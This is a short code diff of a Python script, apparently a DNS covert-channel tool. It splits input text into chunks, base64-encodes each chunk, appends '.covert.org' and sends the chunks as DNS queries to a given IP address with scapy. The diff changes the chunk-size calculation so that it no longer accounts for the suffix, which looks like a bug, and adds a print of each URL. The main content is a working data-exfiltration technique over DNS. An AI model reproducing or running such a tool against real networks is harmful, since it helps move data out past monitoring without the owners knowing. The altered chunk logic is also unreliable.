@@ -20,11 +20,11 @@ def main():
     print( args )
     suffix = ".covert.org"
 
-    n=63-len(suffix)
+    n=63
     chunks = [args.plaintext[i:i+n] for i in range(0, len(args.plaintext), n)]
     for element in chunks:
         url = (base64.b64encode(element.encode("utf-8")).decode()) + suffix
         send(IP(dst=args.destinationIP)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=url,qtype="A")))
-
+        print(url)
 if __name__ == "__main__":
     main()
